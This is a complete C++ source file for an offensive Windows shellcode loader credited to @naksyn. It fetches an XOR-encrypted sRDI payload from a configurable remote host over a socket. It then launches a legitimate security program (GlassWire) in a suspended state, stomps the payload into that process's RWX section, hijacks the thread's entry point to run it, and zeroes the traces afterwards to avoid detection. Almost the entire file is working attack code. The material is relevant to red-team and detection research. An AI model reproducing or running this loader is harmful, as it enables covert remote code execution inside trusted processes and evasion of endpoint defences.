/*
Author: @naksyn (c) 2023
Credits:
  - https://github.com/hasherezade/process_overwriting

Copyright 2023
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE
OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#include "Ws2tcpip.h" //Must include
#include <winsock2.h> //before Windows.h
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <winternl.h>

#pragma comment(lib,"WS2_32")


//MODIFY THIS
#define PAYLOAD_SIZE 327680 //sRDI payload size
char ProgramName[] = "c:\\Program Files (x86)\\GlassWire\\GlassWire.exe";
const char* host = "192.168.1.1";
const unsigned short port = 8000;
DWORD load_offset = 0x14A7000; //the starting virtual address of the target RWX section
DWORD section_RWX_size = 0x76c000; //the size of the RWX section to be written with zeros to avoid WCX regions
bool is32bit = 1;
const std::string xorKey = "Bangarang"; 
// END 

unsigned char shellcode[PAYLOAD_SIZE];


void xorDecrypt(unsigned char* data, size_t size, const std::string& key) {
	for (size_t i = 0; i < size; ++i) {
		data[i] ^= key[i % key.length()];
	}
}


void DownloadShc() {

	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in cleanServer;
	int response_size;

	std::cout << "[+] Initializing Winsock" << std::endl;
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
		std::cerr << "[!] Error initializing Winsock: " << WSAGetLastError() << std::endl;
		exit(1);
	}

	std::cout << "[+] Creating socket" << std::endl;
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
		std::cerr << "[!] Could not create socket: " << WSAGetLastError() << std::endl;
		exit(1);
	}

	InetPtonA(AF_INET, host, &cleanServer.sin_addr.s_addr);
	cleanServer.sin_family = AF_INET;
	cleanServer.sin_port = htons(port);

	std::cout << "[+] Establishing connection to host " << host << " on port " << port << std::endl;
	if (connect(s, reinterpret_cast<struct sockaddr*>(&cleanServer), sizeof(cleanServer)) < 0) {
		std::cerr << "[!] Error establishing connection with server: " << WSAGetLastError() << std::endl;
		closesocket(s);
		WSACleanup();
		exit(1);
	}

	std::cout << "[+] Sleeping 20 seconds to let the netcat transfer finish" << std::endl;
	Sleep(20000);
	// Initialize buffer
	memset(shellcode, 0, sizeof(shellcode));

	std::cout << "[+] Attempting to receive data..." << std::endl;
	if ((response_size = recv(s, reinterpret_cast<char*>(shellcode), PAYLOAD_SIZE, 0)) == SOCKET_ERROR) {
		std::cerr << "[!] Receiving data failed: " << WSAGetLastError() << std::endl;
	}
	else if (response_size == 0) {
		std::cerr << "[!] Connection closed by server" << std::endl;
	}
	else {
		std::cout << "[+] Received " << response_size << " bytes" << std::endl;
	}

	xorDecrypt(shellcode, response_size, xorKey);
	std::cout << "[+] Data decrypted with key: " << xorKey << std::endl;

	closesocket(s);
	WSACleanup();

}

int main()
{

	DWORD dwSize;

	DownloadShc();

	dwSize = sizeof(shellcode);

	HANDLE targetProcessHandle;
	PVOID remoteBuffer;
	HANDLE threadHijacked = NULL;
	HANDLE snapshot;
	THREADENTRY32 threadEntry;
	CONTEXT context = { 0 };
	WOW64_CONTEXT context32 = { 0 };


	context.ContextFlags = CONTEXT_FULL;
	threadEntry.dwSize = sizeof(THREADENTRY32);


	ULONGLONG PEB_addr = 0;

	// create destination process - this is the process to be stomped
	LPSTARTUPINFOA si = new STARTUPINFOA();
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
	DWORD returnLenght = 0;
	std::cout << "[+] Creating process in suspended state: " << ProgramName << std::endl;
	CreateProcessA(NULL, (LPSTR)ProgramName, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);


	HANDLE destProcess = pi->hProcess;

	if (is32bit) {


		// The target is a 32 bit executable while the loader is 64bit,
		// so, in order to access the target we must use Wow64 versions of the functions:

		// 1. Get initial context of the target:
		std::cout << "[+] Getting thread context\n";
		memset(&context32, 0, sizeof(WOW64_CONTEXT));
		context32.ContextFlags = CONTEXT_INTEGER;
		if (!Wow64GetThreadContext(pi->hThread, &context32)) {
			return FALSE;
		}


	}
	else if (!GetThreadContext(pi->hThread, &context))
		return 0;


#if defined(_WIN64)
	if (!context.Rdx) //loader is x64 but target is 32 bit
		PEB_addr = context32.Ebx;
	else
		PEB_addr = context.Rdx;
#else
	PEB_addr = context32.Ebx;
#endif

	if (!PEB_addr) {
		std::cerr << "Failed getting remote PEB address!\n";
		return NULL;
	}
	ULONGLONG img_base_offset = is32bit ?
		sizeof(DWORD) * 2
		: sizeof(ULONGLONG) * 2;


	LPVOID remote_img_base = (LPVOID)(PEB_addr + img_base_offset);

	const size_t img_base_size = is32bit ? sizeof(DWORD) : sizeof(ULONGLONG);

	ULONGLONG load_base = 0;
	SIZE_T read = 0;
	//2. Read the ImageBase fron the remote process' PEB:
	std::cout << "[+] Reading ImageBase parameter from process' PEB\n";
	if (!ReadProcessMemory(pi->hProcess, remote_img_base,
		&load_base, img_base_size,
		&read))
	{
		std::cerr << "Cannot read ImageBaseAddress!\n";
		return NULL;
	}
	
	std::cout << "[+] ImageBase address is 0x" << std::hex << load_base << std::endl;
	std::cout << "[+] Address offset is 0x" << std::hex << load_offset << std::endl;
	
	LPVOID load_base_shifted = (LPBYTE)load_base + load_offset;
	std::cout << "[+] Shellcode will be loaded at address 0x" << std::hex << load_base_shifted << std::endl;



	BOOL result = 0;

	std::cout << "[+] Overwriting RWX section to avoid leaving WCX regions\n";
	BYTE* zeroBuffer = (BYTE*)calloc(section_RWX_size, sizeof(BYTE));
	result = WriteProcessMemory(destProcess, load_base_shifted, zeroBuffer, section_RWX_size, NULL);
	if (!result) {

		fprintf(stderr, "Failed to write buffer to target section. Error: %lu\n", GetLastError());
	}

	if (is32bit) {
		std::cout << "[+] Writing Shellcode\n";
		result = WriteProcessMemory(destProcess, load_base_shifted, shellcode, dwSize, NULL);
		if (!result) {

			fprintf(stderr, "Failed to write shellcode to target process. Error: %lu\n", GetLastError());
		}
	}
	else
		WriteProcessMemory(destProcess, load_base_shifted, shellcode, sizeof shellcode, NULL);

	

	ULONGLONG ep_va = load_base + load_offset;

	std::cout << "[+] Setting new entrypoint at 0x " << std::hex << load_base_shifted << std::endl;

#if defined(_WIN64)
	if (!context.Rcx) //loader is x64 but target is 32 bit
		context32.Eax = static_cast<DWORD>(ep_va);
	else
		context.Rcx = ep_va;
#else
	context32.Eax = static_cast<DWORD>(ep_va);
#endif		
	if (is32bit) {
		// 2. Set the new Entry Point in the context:
		// 3. Set the changed context into the target:
		Wow64SetThreadContext(pi->hThread, &context32);
	}
	else {
		// You shouldn't get the context again, it will overwrite the entry point change.
		// GetThreadContext(pi->hThread, &context);
		SetThreadContext(pi->hThread, &context);
	}

	std::cout << "[+] Resuming the thread\n";

	ResumeThread(pi->hThread);
	std::cout << "[+] Sleeping 2 seconds to let sRDI load the payload" << std::endl;
	Sleep(2000);
	std::cout << "[+] Overwriting the sRDI shellcode\n";
	result = WriteProcessMemory(destProcess, load_base_shifted, zeroBuffer, dwSize, NULL);
	if (!result) {
		fprintf(stderr, "Failed to write buffer to target section. Error: %lu\n", GetLastError());
	}

}
